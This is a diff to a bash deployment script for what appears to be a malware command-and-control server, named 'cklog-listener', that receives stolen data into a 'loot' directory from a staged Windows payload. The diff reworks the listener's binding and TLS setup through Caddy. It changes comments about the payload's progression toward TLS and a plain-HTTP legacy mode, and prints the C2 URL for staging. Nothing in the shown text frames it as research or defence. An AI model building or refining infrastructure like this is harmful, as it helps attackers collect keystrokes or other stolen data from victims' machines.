@@ -10,9 +10,9 @@
 #   3. runs listen.py under systemd, bound to 127.0.0.1
 #   4. terminates TLS with Caddy on 80/443 -- no cert files to renew by hand
 #
-# --plain also opens TCP 9415 for the current payload, which speaks raw
-# Winsock HTTP and cannot do TLS yet (stage 4 adds schannel). Without it only
-# Caddy can reach the listener.
+# --plain is legacy: binds the listener to 0.0.0.0 and opens TCP 9415 for a
+# build that only speaks plain HTTP. The current payload does TLS 1.2 itself,
+# so the default shape (listener on loopback, Caddy on 443) needs no extra port.
 #
 # DNS: point an A/AAAA record at this host before running, or Caddy cannot
 # issue the certificate. The script still finishes and retries on its own.
@@ -21,6 +21,8 @@ set -euo pipefail
 DOMAIN="${1:-}"
 PLAIN=0
 [[ "${2:-}" == "--plain" ]] && PLAIN=1
+BIND=127.0.0.1
+[[ $PLAIN -eq 1 ]] && BIND=0.0.0.0
 
 if [[ -z "$DOMAIN" ]]; then
     echo "usage: $0 c2.example.com [--plain]" >&2
@@ -82,7 +84,7 @@ Group=$SVC_USER
 WorkingDirectory=$APP
 Environment=PYTHONUNBUFFERED=1
 Environment=PYTHONDONTWRITEBYTECODE=1
-ExecStart=$APP/venv/bin/python $APP/listen.py $PORT --bind 127.0.0.1
+ExecStart=$APP/venv/bin/python $APP/listen.py $PORT --bind $BIND
 Restart=always
 RestartSec=3
 UMask=0077
@@ -145,8 +147,7 @@ fi
 echo "loot:     $APP/loot"
 echo "logs:     journalctl -u cklog-listener -f"
 if [[ $PLAIN -eq 1 ]]; then
-    echo "plain:    http://$DOMAIN:$PORT/   (current payload, no TLS)"
+    echo "plain:    http://$DOMAIN:$PORT/   (legacy payload, no TLS)"
 else
-    echo "note:     the current payload speaks plain HTTP; re-run with --plain"
-    echo "          or wait for the schannel stage before using https in --c2"
+    echo "c2:       https://$DOMAIN/         (stage with this)"
 fi
